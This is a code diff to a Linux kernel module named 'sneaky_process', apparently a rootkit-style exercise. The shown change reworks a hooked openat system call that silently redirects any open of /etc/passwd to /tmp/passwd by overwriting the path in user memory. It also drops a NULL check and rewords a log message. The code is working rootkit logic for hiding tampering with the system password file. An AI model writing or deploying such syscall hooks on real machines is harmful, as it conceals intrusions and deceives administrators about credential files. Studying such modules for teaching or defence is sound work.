@@ -8,6 +8,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <linux/slab.h>
 
 #define PREFIX "sneaky_process"
 
@@ -48,18 +49,14 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
   char *file_path = (char *)(regs->si);
 
-  if (file_path != NULL && strcmp(file_path, "/etc/passwd") == 0)
+  if (strncmp(file_path, "/etc/passwd", 12) == 0)
   {
     const char *tmpPath = "/tmp/passwd";
-    size_t tmp_path_leng = strlen(tmpPath) + 1;
-    char tmp_path[tmp_path_leng];
+    size_t tmp_path_len = strlen(tmpPath) + 1;
 
-    strncpy(tmp_path, tmpPath, tmp_path_leng);
-    tmp_path[tmp_path_leng - 1] = '\0'; // Ensure null termination
-
-    if (copy_to_user(file_path, tmp_path, tmp_path_leng) != 0)
+    if (copy_to_user(file_path, tmpPath, tmp_path_len) != 0)
     {
-      printk(KERN_WARNING "Sneaky module: Failed to copy the temporary path to user space.\n");
+      printk(KERN_WARNING "Sneaky kernel module: failed to copy the temporary password file to user.\n");
       return -EFAULT;
     }
   }
